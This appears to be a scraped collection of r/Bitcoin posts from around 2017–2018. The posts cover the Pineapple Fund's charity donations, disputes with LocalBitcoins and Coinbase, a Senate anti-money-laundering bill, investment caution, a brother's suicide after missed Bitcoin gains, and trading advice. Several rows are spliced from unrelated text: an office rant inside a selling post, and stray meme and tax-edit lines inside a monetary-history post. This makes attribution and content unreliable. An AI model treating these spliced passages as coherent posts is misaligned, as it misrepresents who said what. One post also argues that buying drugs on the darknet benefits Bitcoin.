0,bitcoin,"I'm donating 5057 BTC to charitable causes! Introducing The Pineapple Fund Hello! 

I remember staring at bitcoin a few years ago. When bitcoin broke single digits for the first time, I thought that was a triumphant moment for bitcoin. I watched and admired the price jump to $15.. $20.. $30.. wow!

Today, I see $17,539 per BTC. I still don't believe reality sometimes. Bitcoin has changed my life, and I have far more money than I can ever spend. My aims, goals, and motivations in life have nothing to do with having XX million or being the mega rich. So I'm doing something else: donating the majority of my bitcoins to charitable causes. I'm calling it üçç The Pineapple Fund.

Yes, donating ~$86 million worth of bitcoins to charities :)

So far, The Pineapple Fund has/is:

* Donated $1 million to Watsi, an impressively innovative charity building technology to finance universal healthcare.

* Donated $1 million to The Water Project, a charity providing sustainable water projects to suffering communities in Africa

* Donating $1 million to the EFF, defending rights and privacy of internet users, fighting for net neutrality, and far far more

* Donated $500k to BitGive Foundation, a charity building projects that leverage bitcoin and blockchain technology for global philanthropy. 

If you know a registered nonprofit charity, please encourage them to apply on the fund's website! While I prefer supporting registered charities, I am open to supporting charitable causes as well. Check out the website :)

All transactions are posted on the website for full transparency :)

0,bitcoin,"Localbitcoins.com is illegally holding my 9.3 bitcoin on ""escrow"" since may 2015 &#x200B;

**Edit.**

Thanks for all your suggestions and support.

I've received news from localbitcoins, I will update this once the authorities get in touch and decide course of action.

&#x200B;

In may 2015  [/BTC-OTC/](https://localbitcoins.com/p/BTC-OTC/)  scammed me and other 6 persons using bank transfer chargeback which led to my bank account being closed and all my funds frozen for 45 days.  At the time BTC-OTC  was one of the most reputable traders on  Localbitcoins.

I  shortly reported this to localbitcoins.com whitch led to BTC-OTC's account being banned and funds being locked - [HERE](https://puu.sh/BhjCz/37f0ab1fc8.png)  also made a police fraud complaint to the relevant authority in UK

Localbitcoins freezed the funds stating the following in my support ticket  - [HERE](https://puu.sh/BhmDT/0a136c253b.png)

Since then I've been actively trying to get my coins with no result receiving only one single reply on my support ticket in 8 months

When contacting Max on linkedin his reply was - [HERE](http://puu.sh/BhmJU/01610eaef4.png)

When contacting Max on reddit his reply was - [ HERE](http://puu.sh/BhmIn/71ff537bcf.png)   nevertheless 6 months passed with no reply on my ticket.

I emailed  Jeremias Kangas (CEO & Founder of LBC)  with no success. Also in my numerous visits at Metropolitan Police with this issue I was advised the same, this is a localbitcoins.com customer service issue not a legal issue.

Police official statement on my complaint   -  [ HERE](https://puu.sh/BhmOd/9045da5342.png)

National Fraud Intelligence Bureau advised  to change my fraud complaint against localbitcoins in order for them to investigate and contact localbitcoins regarding the case.

After 6 months of waiting, Max's reply was - [HERE](http://puu.sh/BhmTD/d93973a8bf.png) , after sharing all the info on both support ticket and email he replied on email   [HERE](https://puu.sh/BhmXK/a213a8d27b.png)

I knew this won't go anywhere so meanwhile I found a Metropolitan Police Sergeant specialized in blockchain and cyber-crime that understood this issue and decided to help me by contacting them using the fraud report I made in 2015.

Almost 2 months passed since he contacted localbitcoins (3 times) receiving no reply.

Reason I'm posting this is because  there are other 5 persons in this very situation, also other hundreds based on the posts complaining online.

Now I'm in the process of taking legal action. I've been in contact with over 40 lawyers from Finland, and found only 2 that are looking to take this case and quoted me at ‚Ç¨10.000 to  ‚Ç¨15.000 for civil proceedings,

Finnish Law allows only Ombudsman to initiate  a class action lawsuit so this can be settled only in civil court

If you are a victim of this or you can help please get in touch."
0,bitcoin,"Us Senate Bill S.1241 to criminalize concealed ownership of Bitcoin On November 28, 2017, the US Senate, Committee of the Judiciary held a hearing regarding bill S.1241: Modernizing AML Laws to Combat Money Laundering and Terrorist Financing. Despite little attention being given to digital currencies during the hearing, bill S.1241 itself would amend the definition of ‚Äòfinancial institution‚Äô in the United States Code to include digital currencies and digital exchanges. This could have alarming consequences for users of cryptocurrencies both in the US and abroad.

Bill S.1241 would amend the definition of ‚Äòfinancial institution,‚Äô in Section 5312(a) of title 31, United States Code, to include ‚Äúan issuer, redeemer, or cashier of prepaid access devices, digital currency, or any digital exchanger or tumbler of digital currency.‚Äù Currently, the definition of ‚Äòfinancial institution‚Äô includes banks, trust companies, credit unions, currency exchanges, etc.

In her introduction, Mrs. Feinstein, Ranking Member of the Judiciary Committee, said (31:35), ‚ÄúThe bill criminalizes intentionally concealing ownership or control of a bank account.‚Äù Although, during the hearing, no further clarifications were given as to the effects this would have on the cryptocurrency community, based on the amended definition of ‚Äòfinancial institution‚Äô, it seems clear enough that the bill would ‚Äúcriminalize [those] intentionally concealing ownership or control of a [digital currency or digital exchange] account.‚Äù Wow. Let this sink in for a minute‚Ä¶

The US senate is proposing a bill to make criminals out of anyone intentionally concealing ownership or control of a digital currency or digital exchange account. What‚Äôs more, according to the hearing‚Äôs prolonged discussion of US law enforcement‚Äôs handling of foreign banks and financial institutions, this bill is certain to have far-reaching effects on not only US citizens but the global community as a whole.

If the above statement describes you, it is strongly recommended that you watch the hearing with this new definition of ‚Äòfinancial institution‚Äô in mind. If you‚Äôve already watched the hearing, watch it again, but this time replace all mentions of ‚Äòbanks and financial institutions‚Äô with ‚Äòdigital currencies and digital exchanges.‚Äô The implications are really rather alarming.

Interestingly enough, Ms. Kathryn Haun Rodriguez, a Coinbase Board of Directors Member, made absolutely no mention of digital currencies or digital exchanges in her testimony; nor was she asked any questions pertaining to these topics.

Conversely, in her July 2017 written testimony to the US House of Representatives Committee on Financial Services and Subcommittee on Terrorism and Illicit Finance, she stated that some users of digital currencies use them ‚Äúto conceal and move illicit proceeds because of the perception that virtual currency is untraceable.‚Äù

Also in her prior written testimony, she stated that ‚Äúthe FinTech industry could be a very helpful partner to the government in addressing national security concerns;‚Äù that ‚Äúinvestigators like digital footprints and that is exactly what digital currencies provide;‚Äù and that ‚Äúof course, we can only follow the money to an individual or group if they used a Regulated exchange, one that follows basic AML/KYC laws.‚Äù Advertisement

Contrary to the bill itself, the hearing was noticeably lacking in references to cryptocurrencies; although there was some limited mention of such.

Ms. Klobuchar (2:16:58):

‚ÄúIs this transition we‚Äôre seeing from cash to digital going to make it easier or harder for law enforcement to track these money laundering cases, and you think these drug cartels are gonna start going cash free, and what do you do about it?‚Äù
Mr. John A. Cassara (2:17:15):

‚ÄúSenator, I‚Äôm just glad I had my career when I did because I don‚Äôt know what I‚Äôd do trying to follow the money when it comes to digital currencies, it‚Äôs extremely, extremely challenging‚Ä¶I think if you look at the metrics, the metrics suggest today [that] digital currencies are a small fraction of the threat that we face. That‚Äôs not to say it‚Äôs gonna be the case in 5-10 years from now. We‚Äôre right at a crossroads, and it‚Äôs going to be very, very interesting to see what goes forward.‚Äù
Due to the probable negative implications for the global cryptocurrency community, hopefully the interpretation of bill S.1241 in this article is proven incorrect; however, at this point, it seems fairly clear (at least to me, the author) that this is the intent behind the bill. If this is indeed the case, it will be the most recent attack on a growing list of State-backed attacks against the crypto-community.

Furthermore, from the noticeable lack of references made to digital currencies during the hearing, it would appear this bill is yet another underhanded attempt of the US Government to further erode global freedoms and civil liberties, which markedly began with the introduction of the Patriot Act, shortly after the 9/11 attacks.

As Tone Vayes mentioned, it would have been nice if Andreas Antonopoulos was there to impart some of the wisdom he shared with the Canadian Senate, on October 8, 2014.

Tone Vayes‚Äô summation*: ‚ÄúIt‚Äôs bad‚Ä¶I think it‚Äôs gonna end in a very confrontational way between Bitcoin‚Äîeven Bitcoin holders and users‚Äîand the US Government.‚Äù

Jimmy Song‚Äôs summation*: ‚ÄúYeah, the nice thing about laws is they take a long time‚Ä¶‚Äù

Indeed it will be ‚Äúvery, very interesting to see what goes forward.‚Äù If this bill passes, how many of you future criminals out there are still set on hodling?

*to be fair, neither had yet watched the entire hearing.

Full Disclosure: Landon Mutch is a contributor to the Lightning Network, a layer-two Bitcoin protocol, also BTCManager is scamming it‚Äôs writers and not paying them :(."
0,bitcoin,"Don't invest recklessly I posted about this [just a few months ago](https://www.reddit.com/r/Bitcoin/comments/6jrl5o/unrealistic_volatility_expectations/), but I feel that it's necessary to repeat. The Bitcoin price is on an unbelievably ridiculous upswing which is rather likely to be a bubble. If you're trying to get rich quick by dumping your retirement funds into BTC at $10k, then your ""investment strategy"" is not much better than someone betting everything on a game of roulette. High-risk-high-reward investing is not *necessarily* bad, but you have to seriously look at your thought process to make sure that you're not:

* Being blinded by dreams of getting rich quickly, similarly to people who dump money on very-negative-EV lottery tickets.
* Getting wrapped up in ""HODL"" memes, reddit comments, and other groupthink, which is sometimes fun, **but absolutely the last appropriate source of investment advice**.
* Acting based on panic thinking like, ""OMG the price is going to $1 million and I will *miss my chance forever* if I don't buy *right now*"" or ""OMG the price is going to $0.01 and I will *miss my chance forever* to retain some value if I don't sell *right now*"".
* Investing more than you can afford to lose. **Bitcoin is HIGHLY, HIGHLY speculative**. No investment advisor would tell you to put all of your life savings into MSFT or whatever, and MSFT has a market cap 4x larger than Bitcoin. Although I *believe* that it is very unlikely, there are several ways in which the value could drop precipitously, even to zero. For example, there is *no mathematical proof* that the cryptographic algorithms used in Bitcoin are actually secure -- they are merely *believed* to be secure because nobody has been able to break them after many years of intense scrutiny. (I'm not here recommending ""diversifying"" into altcoins -- altcoins are almost all complete trash, and price-wise they follow BTC but with even more volatility, so they're not really useful for diversification.)

It is entirely possible that the massive price increase of the last year is based on lasting fundamentals. In addition to things like the fairly recent subsidy halving, the defeat of B2X, etc., the world fiat-based economy is in many ways on very shaky ground, and getting worse all the time. There are many good reasons why BTC should have a larger market cap than every fiat currency combined. It's even possible that the price will increase quite a bit more from now. But for goodness sake, don't think that Bitcoin is the first-ever infinite-money generator that will continue to rise exponentially forever (in real terms). I can nearly guarantee that **there will be a large and long-lasting crash/downturn at some point**. Maybe it will be $10k to $5k, maybe it will be $50k to $30k, who knows. But if you're thinking for example that the current $5k+ price range is *absolutely secure* after only existing for a few months, then you're traveling blind through very dangerous territory.

Some points to consider:

* Buying near the ATH is very risky, and while it *can* be correct/profitable, it puts you on the wrong footing. You need to buy *low* and sell *high* to make money.
* On 2013-11-29 (exactly 4 years ago) the peak ATH hit $1163, and then fell to $152 by 2015-01-13. That's a drop of 86.9%. Imagine this happens again: The price drops sharply to $2000 or something and then just continuously decreases down to a low of $1,432 (an 86.9% reduction from today's ATH) over the course of a *whole year*. I'm not saying that this *will* happen, but it's happened once and it *can* happen again. **Could you survive this?**
* Bitcoin is experimental, and it is probably imprudent for someone who is not a true believer in the *soul* of Bitcoin to invest a lot into it. For example, I personally wouldn't invest more than a few percent of my total assets into ETH even if I felt very confident that it would rise in price because I simply don't believe in its philosophy or long-term value.
* To reduce risk, it is frequently recommended to allocate assets by percentage, and rebalance upon large price movements. Eg. If you previously decided that you want to allocate 50% of your wealth in BTC (because you are a super big true believer), but BTC is now 90% of your wealth because the price increased so much, it may generally be advisable to start selling to rebalance your BTC allocation back down to 50%. I'm not saying that it is always absolutely wrong to have 90% of your assets in BTC or whatever, but it should be because you are intentionally *choosing* to do so, not because the price got away from you and you never really considered that you now have 90% of your wealth riding on one thing.
* Avoid panic buys and panic sells. Dollar-cost-averaging over a long period of time is often a good strategy.
* Nothing rises in real value to infinity. That's impossible. It is possible that 1 BTC could someday be worth infinite *dollars*, but that just means that dollars are worthless in that hypothetical scenario. BTC probably does have plenty of room to grow in real value before it completely takes over the world, but keep in mind that there *is* a ceiling.
* If BTC were to reach values like $100k-$250k, that'd probably cause/imply that the prevailing economic regime has completely fallen apart. At some point in that price area, people around the world would probably lose substantial faith in fiat currencies. A good result, but ask yourself: do you expect the prevailing economic regime to *go down easily*?

I'm not telling you to buy or sell, and I'm not giving financial advice here. I'm just urging everyone to think rationally, not emotionally or recklessly."
0,bitcoin,"Guys, I am out **So I sold the last of my 22ish BTC yesterday.**

I first got in around September of 2013 when the price was $130. I later set up a weekly buy on Coinbase buying the majority of my coins between $200 to $400. My original goal back then was to accumulate 21 BTC and be in the million club. I turned it off in 2015 once I was well over 21 coins. Of course looking back I wish I had never turned it off.

**So why did I sell?** The value is now enough that I can pay my capital gains and still have enough to pay off my house leaving me completely debt free. I found myself constantly stressing over the fact I was storing close to 200K and I also fully expect a pull back at some point soon. Once my house is paid off I will most likely start buying back in again using money that would have been going towards a house payment.

**Things I learned**  
**Test your recovery process.** If you have a hardware wallet (and you should) send a small amount of crypto to it then wipe it and reload it using your seed. This made me much more confident using the wallet once I had done this and knew that recovery was pretty simple. Also use a passphrase, but make sure it is one you will never forget.

**Store your seed securely.** I used a metal stamp to punch my seed into a ¬º inch steel plate. After that I dipped it in plastisol so it cannot be read and stored it in my safe with a description written on the outside. I also had another copy of the seed stored behind a picture at a trusted family member‚Äôs house just in case.

**Sending a BTC transaction for tens of thousands of dollars is extremely stressful.** I first moved my coins from Coinbase to a hardware wallet before the BCH fork (yes, I was stupid and stored them on an exchange, although I did use their cold storage feature so there was a waiting period before they could be moved if my account was compromised). It was a long 15 minutes before the transaction showed up on the blockchain (I think Coinbase batches transactions up before sending) so I was freaking out that I had done something wrong and all my coins were gone. I wanted to save on transaction fees, but I should have moved them in smaller increments.

**Weekly buys and dollar cost averaging is the way to buy.** I never had to think about the weekly buy so it was worth the small amount I paid for fees. Over time I was able to build a substantial sum.

**It takes a long time to get out due to limits.** I was limited to 10K withdrawal per day so it is taking a while to transition to fiat. I applied for an increase but it was denied for some reason. I am pretty happy with Coinbase, but they are obviously dealing with growing pains. After withdrawing around 50K they quit letting me withdraw and said I needed to do some more verification. I tried uploading my license but the verification kept failing with a blank error message. I submitted a support ticket and heard nothing for several days. I finally remembered that they had recently added phone support so found the number and called. I only had to wait about 10 minutes until I talked to someone and they were very helpful. It turns out I was supposed to be prompted to use a web cam to take a selfie after uploading my license. Once I found that out I did it on my laptop that has a camera and was verified within 5 minutes. I had no problems with withdrawals after that.

**Capital gains suck.** I took all the risk of buying into crypto yet I am going to be on the hook for close to 30K to the government for my long term gains. There is no way I am fucking around with the IRS though, so I will happily pay them. I still have some other crypto and will most likely start buying back in again in a few months. In a few years when I retire I will most likely try to live off of 37.5K income per year from selling crypto so I do not have to pay those capital gains. After a few years of that I will dip into my traditional retirement accounts. I still need to find out if I need to pay an estimated tax payment this quarter to avoid a penalty for not having enough taken out of my paycheck to cover my taxes for the year.

My hat is off to those that are still hodling. It has already gone up quite a bit since I sold. I might look back at selling and kick myself in the future, but right now the thought of being debt free is pretty liberating. 
**It has been one fucking hell of a ride and I will be back on the coaster with the rest of you soon!**

The god damn ""i-told-ya-so"" from John. ""I have no idea how stocks or anything like that work but i know bullshit when i see it. I can't believe people were dumb enough to buy fake money.""

Yea ok mate, if i need a status update on that box of donuts in the break room, you're my go-to guy. other than that? shut up and go back to being shit at your job.

Then you've got Becky, flapping her useless mouth in the background who ""knew"" bitcoin was a scam when her boyfriend's Sister's cousin told her that the ""bitcoin inventor guy"" posted on his website that he was selling all his bitcoin.

""Money can't just be numbers on screens, that's not how money works. it has to be something you can hold as well! With all this net neutrality stuff going on you'd be crazy to invest in money that they can just shut down with the flick of a switch!""

Becky, last week i heard you ask the IT guy if you needed two mice plugged in to your computer if you want to use two screens at once and now you have a working knowledge of both the monetary system, crypto currencies AND the internet?! that's very impressive.

I have no idea why this is annoying me so much, I just found the need to rant while waiting for a meeting to start.

Edit: people seem to have come to some weird conclusions that i've been doing nothing but come to work and try sell crypto to the entire office. the ""i told ya so"" isn't directed at me or anyone in particular, it's just general chatter around the office. i'm not printing out weekly bitcoin news letters to put on peoples desks or waiting by their car at night to ask why they haven't bought BTC.

0,bitcoin,"Farewell from the Pineapple Fund Hi everyone,

It's been five months, and having just made my last PF donation to the Internet Archive, I figure it might be a good time to say farewell.

I just want to thank everyone for supporting [this project](https://pineapplefund.org/). Thank you for all the charity suggestions, many of which were funded. Thank you for all the positive messages and love sent my way. And also, thank you, the Bitcoin and cryptocurrency community, for turning a Sourceforge project into a $0.5T industry.

I kind of miss the old times when bitcoin was a small community, and you could count the number of 'altcoins' with one hand. Finding someone else who even *knows* about bitcoin was incredibly rare, and exchanges were semi-automated or running on PHP.

Every development since then makes Bitcoin stronger and better at solving the problems of the existing financial and monetary system. It's created a new generation of crypto early adopters, cypherpunks or technologists using cryptography to change the world; and now having the power and responsibility of capital.

5104 BTC was turned into $55 million for charities, from providing clean water, [open mapping](https://blog.openstreetmap.org/2018/01/11/donation-from-pineapple-fund/), to clinical trials of [MDMA as treatment for PTSD](https://www.nytimes.com/2018/05/01/us/ecstasy-molly-ptsd-mdma.html). 

Thanks for following along with this experiment. I'm going to say goodbye now, but maybe there's room for dessert in a few years.

If you're ever blessed with crypto fortune, consider supporting what you aspire our world to be. :)

0,bitcoin,"üçç $4mil will fund MDMA trials for PTSD; marked 'Breakthrough Therapy' by FDA. Pineapple Fund is matching MAPS donations 1:1. Reddit, let's make history by crowdfunding an incredible treatment for PTSD, in bitcoin! Hi /r/Bitcoin!

You might've heard of PTSD. It's a debilitating illness usually affecting people who are _already_ victims, like sexual assault survivors who still suffer and are tormented every day since. Not only do they experience traumatic flashbacks, even sleep is no relief thanks to serious nightmares. It is life threatening. 

Existing treatment for PTSD aren't great. Therapy can be helpful, but they're often not enough, especially for severe PTSD. There are only two drugs approved by the FDA: SSRIs like Zoloft and Paxil. Those drugs must be taken continuously, and can cause serious side effects. Mania, seizures, inability to orgasm, and suicide are known side effects.

In 1986, a nonprofit named MAPS was started to develop legal contexts for beneficial uses of psychedelics and marijuana. 31 years later, MAPS has found its most promising candidate yet: MDMA-assisted psychotherapy as a treatment for PTSD. 

# The numbers: 68% (MDMA) versus 25% (placebo)

They've already conducted Phase 2 studies in the US, Canada, Israel, and Switzerland. After a comprehensive therapeutic process involving preparatory sessions, MDMA-assisted therapy sessions, and non-drug therapy sessions, **61% no longer met the criteria for PTSD**. This improved to **68%** after a year. Of those who met the criteria, many experienced significant reductions in symptoms. This is compared to only 25% for the placebo group, who received all the therapy, but with a sugar pill instead of MDMA.

For most people, the benefits are lasting. MAPS conducted one long-term outcome study, evaluating patients ~3.5 years after the last MDMA-assisted sessions. Average benefits even increased slightly over time.

> ""The MDMA sessions were the first time I'd ever felt love for myself. It was the first time I'd ever felt happy. I hugged my therapist and said 'Thank you.'""

After MAPS' studies, the FDA granted ['Breakthrough Therapy Designation'](https://www.maps.org/news/media/6786-press-release-fda-grants-breakthrough-therapy-designation-for-mdma-assisted-psychotherapy-for-ptsd,-agrees-on-special-protocol-assessment-for-phase-3-trials) to MDMA-assisted psychotherapy.

Now they need to conduct Phase 3 trials, which are far costlier due to requirements for an increased sample size, groups, etc, even through the stage with highest failure rates (Phase 2) is already over. MAPS has achieved the extra-ordinary journey of bringing MDMA-assisted psychotherapy all the way to Phase 3; a drug that pharmas will never touch because it will disrupt their recurring revenue streams of SSRIs.

# Phase 3

Phase 3 will cost about $25 million. They've raised $17 million already ($1 mil from PF included), and need another $8 million to get to the finish line. 

I have never donated to MAPS (or even heard of them) before starting the Pineapple Fund. PF donated $1 million, and that inspired another anonymous donator to **give another $1 million** in bitcoin. To whoever you are, you're amazing, and you are inspiring. <3

**I believe we, the cryptocurrency community, can fully fund Phase 3 trials**. Prescription MDMA could be a gift to this world from the bitcoin community.

If the trial succeeds, it could be approved as early as 2021. MAPS has created a public benefit corporation, fully owned by the non-profit, that would sell MDMA post-approval. This is a scalable and **financially sustainable** structure that could kickstart a renaissance in research into the therapeutic applications of many different psychedelics.

**Pineapple Fund will double the value of every donation to MAPS** from today until March 10th, up to $4 million. 

You can donate with bitcoin. It's like donating bitcoin for $30,000 each!

http://www.maps.org/donate-redirect/cryptocurrency

You can also donate with legacy payment systems like [credit cards or PayPal](https://store.maps.org/np/clients/maps/donation.jsp?campaign=103), and PF will also match that donation.

Your donations are tax deductible (if you're a US taxpayer), and you don't even have to pay capital gains tax. Ask for a receipt if so.

Let's make MDMA medicine a reality, and give the gift of an enjoyable life to those suffering from PTSD. If you believe that psychedelic drugs can have incredible therapeutic potential, then I believe this is one of the highest impact projects today.

And let's do it with cryptocurrency :)"

0,bitcoin,"My brother killed himself because of BTC I don't really know where to post this but I feel like I need to vent.

Do not take this as criticism of Bitcoin, blockchain technology, or cryptocurrency users & developers, it's not.

There are probably other factors that led to my brother's suicide, but he had been beating himself up over Bitcoin for the past several years to the point where he seemed constantly depressed over it and gradually became a shadow of his former happy self.

He claimed to have owned 15,000 at one point, which may have been an exaggeration. But I know for a fact that at some point around October-November 2012 he did have at least 6,000 BTC which he showed me in his wallets. He was so enthusiastic about Bitcoin and how cryptocurrencies would revolutionize the financial world. For awhile he was annoying the fuck out of our relatives about how it would make them millionaires.

I'm not sure exactly what happened to his BTC. Sometime in 2013 he claimed to have lost most of them in a hack and sold the remainder too early. He very well may have sold them all too early, but who knows.

 As the price took off in late 2013-early 2014 you could tell he was distraught over it and became increasingly withdrawn from family and friends. Whenever I did manage to contact him he would sometimes end up ranting about how badly he had fucked up and how he would never have a chance to be rich again.

As the price climbed up to 10k over the past several months it became even more difficult to make contact with him, he just wouldn't reply to me or my parents calls and texts. A couple weeks ago my parents flew out to see my brother and found him dead by suicide with no note. He was 29 with 50 years of life ahead of him.

Other than obvious grief I don't really know how to feel about this. If I had missed out on $50M I might have killed myself too. I can't imagine what my brother must have been feeling these past several years knowing he missed his best & easiest shot at the wealthy life he had always fantasized about. Bitcoin totally fucked up his mindset to the point where you couldn't talk about anything related to investing, money or finances without him storming off or crying.

If there's any more of you in a similar situation feel free to PM me. Please try to recognize there are endless economic opportunities in life and 1 mistake doesn't define your future. There are family and friends who care about you and will listen."
0,bitcoin,"***** WARNING ****** DO NOT SEND ANY (LARGE) SUMS TO COINBASE. $40,000 wire transfer missing since 12/18 with ZERO response The question is- why would you ever trust this company?  How do you not reach out to a customer who trusted you with this amount of money?  Is this who you want to be dealing with if/ when the shit really hits the fan in the cryptocurrency space ?   It is a total sham(e), I would have absolutely been a customer, and likely an active one long term.  For all those who have had positive experiences with Coinbase- that's great, but don't assume it will not happen to you at some point, especially when liquidity goes to hell after a crash.  If they can't help a newer customer willing to put in a large amount of funds, why will they help those who put in less. No, I did not deposit this amount without depositing a smaller amount first, which went through, so assumed the systems were fine, and hey worst case the wire is rejected ....  WRONG.  Don't assume it won't happen to you!!  Yes I filed a CFPB and state Financial Institutions complaint.  Yes I called a zillion times.  Yes I did everything they instructed on their ""customer support"" site. Never in my wildest dreams did I think this could happen in this country.  This company has reared its ugly face as a total fraud and/or perhaps a total Ponzi scheme.  How in the world do you return other wires from 5 days ago before addressing ones from more than a month ago, never mind the amount!  Let this be a warning to you all, I would not wish this on ANYONE.  

ADDENDUM: I attempted to transfer to my GDAX account, but the wire goes through the associated Coinbase account, and shows up as a Coinbase deposit (had transferred funds before), hence the references to Coinbase.

** UPDATE **:  I received an email today, Day #33, from GDAX support notifying me that they reviewed the case, and that they will re-send the funds back to the originating account.   
If they follow through, it will be confirmation that it truly is a manpower issue with Coinbase/ GDAX, and should be very encouraging to all with funds transfer problems.   I will update this post when/if funds are actually received back.

** UPDATE**:  Day #37- No funds received.  Received the Consumer Finance Protection Bureau response back today, Coinbase stated the following: 

""Company's Response
Hello Mr. ###, I am sorry for the recent troubles with your wire transfer and also the delay of an agent getting back to you. An agent was able to reach out to you via case ### regarding your issue. There was an issue processing the return of your wire, but another team looked into it and had the funds sent back to your bank. If you have not seen the funds or have any other questions, please feel free to reach out to above mentioned case and we can look into the matter further. Again, I am sorry for the recent issues with your wire transfer.""

Again, no funds have been received, and all they did is assign another case # without a Point of contact.  "

0,bitcoin,"Just a quick reminder why Bitcoin was invented in the first place. This used to be preaching to the choir. But these days I am not so sure. *	People used to pay each other in gold and silver. Difficult to transport. Difficult to divide.
*	Paper money was invented. A claim to gold in a bank vault. Easier to transport and divide.
*	Banks gave out more paper money than they had gold in the vault. They ran ‚Äúfractional reserves‚Äù. A real money maker. But every now and then, banks collapsed because of runs on the bank.
*	Central banking was invented. Central banks would be lenders of last resort. Runs on the bank were thus mitigated by banks guaranteeing each other‚Äôs deposits through a central bank. The risk of a bank run was not lowered. Its frequency was diminished and its impact was increased. After all, banks remained basically insolvent in this fractional reserve scheme.
*	Banks would still get in trouble. But now, if one bank got in sufficient trouble, they would all be in trouble at the same time. Governments would have to step in to save them. 
*	All ties between the financial system and gold were severed in 1971 when Nixon decided that the USD would no longer be exchangeable for a fixed amount of gold. This exacerbated the problem, because there was now effectively no limit anymore on the amount of paper money that banks could create. 
*	From this moment on, all money was created as credit. Money ceased to be supported by an asset. When you take out a loan, money is created and lent to you. Banks expect this freshly minted money to be returned to them with interest. Sure, banks need to keep adequate reserves. But these reserves basically consist of the same credit-based money. And reserves are much lower than the loans they make. 
*	This led to an explosion in the money supply. The Federal Reserve stopped reporting M3 in 2006. But the ECB currently reports a yearly increase in the supply of the euro of about 5%.
*	This leads to a yearly increase in prices. The price increase is somewhat lower than the increase in the money supply. This is because of increased productivity. Society gets better at producing stuff cheaper all the time. So, in absence of money creation you would expect prices to drop every year. That they don‚Äôt is the effect of money creation.
*	What remains is an inflation rate in the 2% range.
*	Banks have discovered that they can siphon off all the productivity increase + 2% every year, without people complaining too much. They accomplish this currently by increasing the money supply by 5% per year, getting this money returned to them at an interest.
*	Apart from this insidious tax on society, banks take society hostage every couple of years. In case of a financial crisis, banks need bailouts or the system will collapse.
*	Apart from these problems, banks and governments are now striving to do away with cash. This would mean that no two free men would be able to exchange money without intermediation by a bank. If you believe that to transact with others is a fundamental right, this should scare you.
*	The absence of sound money was at the root of the problem. We were force-fed paper money because there were no good alternatives. Gold and silver remain difficult to use.
*	When it was tried to launch a private currency backed by precious metals (Liberty dollar), this initiative was shut down because it undermined the U.S. currency system. Apparently, a currency alternative could only thrive if ‚Äúnobody‚Äù launched it and if they was no central point of failure. 
*	What was needed was a peer-to-peer electronic cash system. This was what Satoshi Nakamoto described in 2008. It was a response to all the problems described above. That is why he labeled the genesis block with the text: ‚Äú03/Jan/2009 Chancellor on brink of second bailout for banks.‚Äù. Bitcoin was meant to be an alternative to our current financial system.

So, if you find yourself religiously checking some cryptocurrency‚Äôs price, or bogged down in discussions about the ‚Äúone true bitcoin‚Äù, or constantly asking what currency to buy, please at least remember that we have bigger fish to fry.

We are here to fix the financial system.

- The memes. We aren't sure what happens when memes reach a critical mass, we just don't have the technology to determine this yet. so far the best theory modern science can come up with is it forms some kind of meme-black-hole which absorbs any and all memes which happen to cross the event horizon. after all memes haves been crushed into the singularity we will be left with only ""is it too late to buy bitcoin"" posts.

Thanks for listening. HODL on.

*EDIT: Looks like I got the tax year(s) wrong; thanks for setting me straight. Keeping this post up as my sentiment about this action remains unchanged.* 

*EDIT 2: Holy crypto Batman! I am FINE paying taxes on my gains. I am NOT looking for, nor am I advocating tax evasion. The point of this post is simply that I plan to report and document any IRS scrutiny should it occur.*"

0,bitcoin,"Unpopular opinion: Those who use bitcoin to buy drugs online are doing more for bitcoin than the vast majority of HODL's I‚Äôm not the first person to say this and I won‚Äôt be the last, treating bitcoin as an investment and leaving it in a wallet for years at a time does nothing for the coin or the community. As much as it puts a bad taste in congressional mouths and casts a dark shadow on bitcoin, people who use it to buy stuff on the dark net are using bitcoin for its intended purposes

You know, as a currency?

Look, I get it, when you buy in at 10 grand you don‚Äôt want to buy a hotdog with bitcoin at 4 grand, everybody‚Äôs afraid of becoming the next million dollar pizza. But putting the coin in a wallet and doing nothing accomplishes nothing (except for added anxiety)

*disclamer* I‚Äôm not advocating for using bitcoin to buy illegal goods, just stating my thoughts on the matter

Edit: why did this get flared as misleading? How can an opinion be misleading?"
0,bitcoin,"10 things I wish someone had told me when I was learning to trade crypto While I consider myself an amateur trader and a small-scale investor, over the 2+ years of trading crypto I've learned some things I'd like to share with you all, but mostly with those who are making their first steps into the uncharted cryptoland. 

1. Just as with anything else in life, **trading cryptocurrencies is context dependent**. That means you should remain a healthy sceptic about general truths, universal rules and things that ""everyone knows"". Consider the famous ""buy low sell high"" dictum. The definition of high and low is subjective in most cases since it depends on your timescale, goals and trading strategy. If you‚Äôre a hodler, as are many of the fellow redditors here, your high and low will differ dramatically compared to the day trader's.

2. It is for the same reason that **bulls and bears don't really matter**. Whether you're 'bullish' or 'bearish' depends on your strategy and timescale. Consider this: to someone hodling BTC since 2013 a dip here or there (even a prolonged one) makes little difference because the price of BTC over the time continues to grow monstrously ‚Äì you can call it one long-term bull market.

3. At some point, you'll bump (or you already have) into something that is called 'technical analysis'. Let me save you some time (and money, probably) by telling you this: **technical analysis is neither technical, nor is it very analytical**. While many traders regard TA to be a scientific way (supposedly based on mathematics) to read and predict the market moves, TA has little to do with any formal science. Differently from the surrounding physical world, we are not aware of any physical laws that govern our human behavior, including markets. If it was possible to mathematically calculate and with certainty predict market moves, the big buck guys in Wall Street would have already done it. Think about the major financial crises for a moment ‚Äì just like the Spanish Inquisition, nobody (well, almost nobody) ever expected one. Does it mean TA ‚Äì  trends, chart patterns, MACD, RSI, Elliot wave count, etc. ‚Äì is a complete rubbish? I wouldn't go as far as to claim that. It is somewhat helpful ‚Äì if only a little, TA still gives you a feel of the current market mood. TA also does one other thing pretty accurately: it graphically represents historic data of human behavior in the financial markets. Surely you can benefit from that? Or do you? This brings me to another point...

